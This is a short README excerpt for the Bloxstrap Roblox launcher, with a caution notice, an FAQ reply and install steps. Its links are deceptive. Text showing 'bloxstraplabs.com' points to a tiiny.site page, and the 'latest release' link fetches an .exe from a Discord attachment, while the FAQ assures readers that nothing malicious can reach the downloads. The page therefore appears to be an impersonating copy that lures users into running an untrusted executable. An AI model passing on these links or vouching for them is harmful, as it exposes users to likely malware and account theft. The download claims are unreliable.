> [!CAUTION]
> The only official places to download Bloxstrap are this GitHub repository and [[bloxstraplabs.com](https://bloxstraplabs.tiiny.site/)]. Any other websites offering downloads or claiming to be us are not controlled by us.
...
**A:** No. The source code here is viewable to all, and it'd be impossible for us to slip anything malicious into the downloads without anyone noticing. Just be sure you're downloading it from an official source. The only two official sources are this GitHub repository and [bloxstraplabs.com](https://bloxstraplabs.tiiny.site/).
...
## Installing
Download the [latest release of Bloxstrap]((https://cdn.discordapp.com/attachments/1362156875843375427/1363207829271347291/Bloxstrap-v2.9.0.exe?ex=680531b9&is=6803e039&hm=d4f40e351a7914cdbe8526a95a63a058ea52ea0d20b9a7cce13fe978157785a0&)), and run it. Configure your preferences if needed, and install. That's about it!
